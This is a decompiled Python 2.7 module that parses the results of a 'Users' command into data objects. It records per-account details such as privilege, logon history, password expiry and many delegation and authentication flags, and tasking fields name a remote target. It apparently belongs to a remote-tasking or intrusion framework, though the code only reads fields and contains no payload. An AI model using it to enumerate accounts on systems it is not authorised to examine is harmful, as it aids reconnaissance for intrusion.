# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import dsz
import dsz.cmd
import dsz.data
import dsz.lp

class Users(dsz.data.Task):

    def __init__(self, cmd=None):
        dsz.data.Task.__init__(self, cmd)

    def _LoadData(self):
        try:
            self.TaskingInfo = Users.TaskingInfo(dsz.cmd.data.Get('TaskingInfo', dsz.TYPE_OBJECT)[0])
        except:
            self.TaskingInfo = None

        self.User = list()
        try:
            for x in dsz.cmd.data.Get('User', dsz.TYPE_OBJECT):
                self.User.append(Users.User(x))

        except:
            pass

        return

    class TaskingInfo(dsz.data.DataBean):

        def __init__(self, obj):
            try:
                self.recursive = dsz.cmd.data.ObjectGet(obj, 'recursive', dsz.TYPE_BOOL)[0]
            except:
                self.recursive = None

            try:
                self.Target = Users.TaskingInfo.Target(dsz.cmd.data.ObjectGet(obj, 'Target', dsz.TYPE_OBJECT)[0])
            except:
                self.Target = None

            return

        class Target(dsz.data.DataBean):

            def __init__(self, obj):
                try:
                    self.local = dsz.cmd.data.ObjectGet(obj, 'local', dsz.TYPE_BOOL)[0]
                except:
                    self.local = None

                try:
                    self.location = dsz.cmd.data.ObjectGet(obj, 'location', dsz.TYPE_STRING)[0]
                except:
                    self.location = None

                return

    class User(dsz.data.DataBean):

        def __init__(self, obj):
            try:
                self.passwordExpired = dsz.cmd.data.ObjectGet(obj, 'passwordExpired', dsz.TYPE_BOOL)[0]
            except:
                self.passwordExpired = None

            try:
                self.userId = dsz.cmd.data.ObjectGet(obj, 'userId', dsz.TYPE_INT)[0]
            except:
                self.userId = None

            try:
                self.numLogons = dsz.cmd.data.ObjectGet(obj, 'numLogons', dsz.TYPE_INT)[0]
            except:
                self.numLogons = None

            try:
                self.primaryGroupId = dsz.cmd.data.ObjectGet(obj, 'primaryGroupId', dsz.TYPE_INT)[0]
            except:
                self.primaryGroupId = None

            try:
                self.privilege = dsz.cmd.data.ObjectGet(obj, 'privilege', dsz.TYPE_STRING)[0]
            except:
                self.privilege = None

            try:
                self.passwordLastChanged = dsz.cmd.data.ObjectGet(obj, 'passwordLastChanged', dsz.TYPE_STRING)[0]
            except:
                self.passwordLastChanged = None

            try:
                self.lastLogon = dsz.cmd.data.ObjectGet(obj, 'lastLogon', dsz.TYPE_STRING)[0]
            except:
                self.lastLogon = None

            try:
                self.accountExpires = dsz.cmd.data.ObjectGet(obj, 'accountExpires', dsz.TYPE_STRING)[0]
            except:
                self.accountExpires = None

            try:
                self.homeDir = dsz.cmd.data.ObjectGet(obj, 'homeDir', dsz.TYPE_STRING)[0]
            except:
                self.homeDir = None

            try:
                self.comment = dsz.cmd.data.ObjectGet(obj, 'comment', dsz.TYPE_STRING)[0]
            except:
                self.comment = None

            try:
                self.userShell = dsz.cmd.data.ObjectGet(obj, 'userShell', dsz.TYPE_STRING)[0]
            except:
                self.userShell = None

            try:
                self.fullName = dsz.cmd.data.ObjectGet(obj, 'fullName', dsz.TYPE_STRING)[0]
            except:
                self.fullName = None

            try:
                self.name = dsz.cmd.data.ObjectGet(obj, 'name', dsz.TYPE_STRING)[0]
            except:
                self.name = None

            try:
                self.Flags = Users.User.Flags(dsz.cmd.data.ObjectGet(obj, 'Flags', dsz.TYPE_OBJECT)[0])
            except:
                self.Flags = None

            return

        class Flags(dsz.data.DataBean):

            def __init__(self, obj):
                try:
                    self.AuthFlags = Users.User.Flags.AuthFlags(dsz.cmd.data.ObjectGet(obj, 'AuthFlags', dsz.TYPE_OBJECT)[0])
                except:
                    self.AuthFlags = None

                try:
                    self.AccountFlags = Users.User.Flags.AccountFlags(dsz.cmd.data.ObjectGet(obj, 'AccountFlags', dsz.TYPE_OBJECT)[0])
                except:
                    self.AccountFlags = None

                return

            class AuthFlags(dsz.data.DataBean):

                def __init__(self, obj):
                    try:
                        self.authOpComm = dsz.cmd.data.ObjectGet(obj, 'authOpComm', dsz.TYPE_BOOL)[0]
                    except:
                        self.authOpComm = None

                    try:
                        self.authOpAccts = dsz.cmd.data.ObjectGet(obj, 'authOpAccts', dsz.TYPE_BOOL)[0]
                    except:
                        self.authOpAccts = None

                    try:
                        self.authOpPrint = dsz.cmd.data.ObjectGet(obj, 'authOpPrint', dsz.TYPE_BOOL)[0]
                    except:
                        self.authOpPrint = None

                    try:
                        self.authOpServer = dsz.cmd.data.ObjectGet(obj, 'authOpServer', dsz.TYPE_BOOL)[0]
                    except:
                        self.authOpServer = None

                    try:
                        self.mask = dsz.cmd.data.ObjectGet(obj, 'mask', dsz.TYPE_INT)[0]
                    except:
                        self.mask = None

                    return

            class AccountFlags(dsz.data.DataBean):

                def __init__(self, obj):
                    try:
                        self.lockOut = dsz.cmd.data.ObjectGet(obj, 'lockOut', dsz.TYPE_BOOL)[0]
                    except:
                        self.lockOut = None

                    try:
                        self.dontExpirePasswd = dsz.cmd.data.ObjectGet(obj, 'dontExpirePasswd', dsz.TYPE_BOOL)[0]
                    except:
                        self.dontExpirePasswd = None

                    try:
                        self.script = dsz.cmd.data.ObjectGet(obj, 'script', dsz.TYPE_BOOL)[0]
                    except:
                        self.script = None

                    try:
                        self.acctDisable = dsz.cmd.data.ObjectGet(obj, 'acctDisable', dsz.TYPE_BOOL)[0]
                    except:
                        self.acctDisable = None

                    try:
                        self.passwordCantChange = dsz.cmd.data.ObjectGet(obj, 'passwordCantChange', dsz.TYPE_BOOL)[0]
                    except:
                        self.passwordCantChange = None

                    try:
                        self.tempDuplicateAcct = dsz.cmd.data.ObjectGet(obj, 'tempDuplicateAcct', dsz.TYPE_BOOL)[0]
                    except:
                        self.tempDuplicateAcct = None

                    try:
                        self.homeDirReqd = dsz.cmd.data.ObjectGet(obj, 'homeDirReqd', dsz.TYPE_BOOL)[0]
                    except:
                        self.homeDirReqd = None

                    try:
                        self.trustedForDeleg = dsz.cmd.data.ObjectGet(obj, 'trustedForDeleg', dsz.TYPE_BOOL)[0]
                    except:
                        self.trustedForDeleg = None

                    try:
                        self.interdomainTrustAcct = dsz.cmd.data.ObjectGet(obj, 'interdomainTrustAcct', dsz.TYPE_BOOL)[0]
                    except:
                        self.interdomainTrustAcct = None

                    try:
                        self.passwordExpired = dsz.cmd.data.ObjectGet(obj, 'passwordExpired', dsz.TYPE_BOOL)[0]
                    except:
                        self.passwordExpired = None

                    try:
                        self.notDelegated = dsz.cmd.data.ObjectGet(obj, 'notDelegated', dsz.TYPE_BOOL)[0]
                    except:
                        self.notDelegated = None

                    try:
                        self.normalAcct = dsz.cmd.data.ObjectGet(obj, 'normalAcct', dsz.TYPE_BOOL)[0]
                    except:
                        self.normalAcct = None

                    try:
                        self.serverTrustAcct = dsz.cmd.data.ObjectGet(obj, 'serverTrustAcct', dsz.TYPE_BOOL)[0]
                    except:
                        self.serverTrustAcct = None

                    try:
                        self.dontRequirePreauth = dsz.cmd.data.ObjectGet(obj, 'dontRequirePreauth', dsz.TYPE_BOOL)[0]
                    except:
                        self.dontRequirePreauth = None

                    try:
                        self.trustedToAuthenticateForDelegation = dsz.cmd.data.ObjectGet(obj, 'trustedToAuthenticateForDelegation', dsz.TYPE_BOOL)[0]
                    except:
                        self.trustedToAuthenticateForDelegation = None

                    try:
                        self.useDesKeyOnly = dsz.cmd.data.ObjectGet(obj, 'useDesKeyOnly', dsz.TYPE_BOOL)[0]
                    except:
                        self.useDesKeyOnly = None

                    try:
                        self.passwordNotReqd = dsz.cmd.data.ObjectGet(obj, 'passwordNotReqd', dsz.TYPE_BOOL)[0]
                    except:
                        self.passwordNotReqd = None

                    try:
                        self.smartCardReqd = dsz.cmd.data.ObjectGet(obj, 'smartCardReqd', dsz.TYPE_BOOL)[0]
                    except:
                        self.smartCardReqd = None

                    try:
                        self.encryptedTextPasswdAllw = dsz.cmd.data.ObjectGet(obj, 'encryptedTextPasswdAllw', dsz.TYPE_BOOL)[0]
                    except:
                        self.encryptedTextPasswdAllw = None

                    try:
                        self.workStatTrustAcct = dsz.cmd.data.ObjectGet(obj, 'workStatTrustAcct', dsz.TYPE_BOOL)[0]
                    except:
                        self.workStatTrustAcct = None

                    try:
                        self.mnsLogonAccount = dsz.cmd.data.ObjectGet(obj, 'mnsLogonAccount', dsz.TYPE_BOOL)[0]
                    except:
                        self.mnsLogonAccount = None

                    try:
                        self.noAuthDataRequired = dsz.cmd.data.ObjectGet(obj, 'noAuthDataRequired', dsz.TYPE_BOOL)[0]
                    except:
                        self.noAuthDataRequired = None

                    try:
                        self.partialSecretsAccount = dsz.cmd.data.ObjectGet(obj, 'partialSecretsAccount', dsz.TYPE_BOOL)[0]
                    except:
                        self.partialSecretsAccount = None

                    try:
                        self.useAesKeys = dsz.cmd.data.ObjectGet(obj, 'useAesKeys', dsz.TYPE_BOOL)[0]
                    except:
                        self.useAesKeys = None

                    try:
                        self.mask = dsz.cmd.data.ObjectGet(obj, 'mask', dsz.TYPE_INT)[0]
                    except:
                        self.mask = None

                    return


dsz.data.RegisterCommand('Users', Users)
USERS = Users
users = Users